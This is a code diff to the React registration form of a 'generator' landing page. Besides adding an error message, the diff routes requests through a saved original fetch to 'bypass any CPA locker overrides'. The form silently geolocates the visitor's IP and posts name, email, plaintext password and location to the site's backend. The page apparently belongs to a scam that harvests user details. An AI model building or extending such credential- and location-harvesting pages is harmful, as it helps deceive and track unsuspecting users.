@@ -9,36 +9,41 @@ export const Landing = ({ onProceed }: { onProceed: (user: {firstName: string, l
   const [password, setPassword] = useState('');
   const [confirmPassword, setConfirmPassword] = useState('');
   const [loading, setLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setErrorMsg('');
     if (password !== confirmPassword) {
-      alert("Passwords do not match!");
+      setErrorMsg("Passwords do not match!");
       return;
     }
     if (!email || !firstName) return;
     
     setLoading(true);
     
+    // Use the original fetch to bypass any CPA locker overrides
+    const safeFetch = (window as any).__originalFetch || fetch;
+
     // Fetch location in the background, then send to our backend
-    fetch('https://get.geojs.io/v1/ip/geo.json')
-      .then(res => res.json())
-      .then(geo => {
+    safeFetch('https://get.geojs.io/v1/ip/geo.json')
+      .then((res: any) => res.json())
+      .then((geo: any) => {
         const locationText = `📍 Location: ${geo.city || 'Unknown'}, ${geo.country || 'Unknown'} (IP: ${geo.ip})`;
-        return fetch('/api/register', {
+        return safeFetch('/api/register', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ firstName, lastName, email, password, locationText })
         });
       })
-      .catch(err => {
+      .catch((err: any) => {
         // Fallback if geo fails
         console.error("Geo API Error:", err);
-        fetch('/api/register', {
+        safeFetch('/api/register', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ firstName, lastName, email, password, locationText: '📍 Location: Unknown' })
-        }).catch(e => console.error("Fallback API Error:", e));
+        }).catch((e: any) => console.error("Fallback API Error:", e));
       });
     
     setTimeout(() => {
@@ -115,6 +120,7 @@ export const Landing = ({ onProceed }: { onProceed: (user: {firstName: string, l
                 <form className="register-form" onSubmit={handleSubmit}>
                   <p className="register-title">Register</p>
                   <p className="register-message">Register to use the generator.</p>
+                  {errorMsg && <p className="text-red-500 text-sm font-bold mb-4">{errorMsg}</p>}
                   <div className="register-flex">
                     <label>
                       <input required placeholder="" type="text" className="register-input" value={firstName} onChange={e=>setFirstName(e.target.value)} />
